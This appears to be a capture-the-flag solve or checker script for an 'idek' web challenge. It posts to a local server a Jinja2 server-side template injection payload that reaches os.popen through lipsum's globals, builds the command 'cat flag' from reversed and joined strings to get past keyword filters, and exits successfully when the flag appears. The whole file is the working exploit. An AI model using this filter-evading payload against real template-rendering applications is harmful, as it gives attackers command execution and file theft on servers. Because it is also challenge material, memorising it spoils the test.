#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import requests
import re

url = "http://localhost:1337/"
payload = '{{lipsum[(dict(__globals__=x)|list)[False]][(dict(os=x)|list)[False]][(dict(popen=x)|list)[False]]([(dict(cat=x)|list)[False]|center,(dict(galf=x)|list)[False]|reverse]|join)[(dict(daer=x)|list)[False]|reverse]()}}'

r = requests.post(url, data={'q': payload})

if 'idek{' in r.text:
    exit(0)
exit(1)
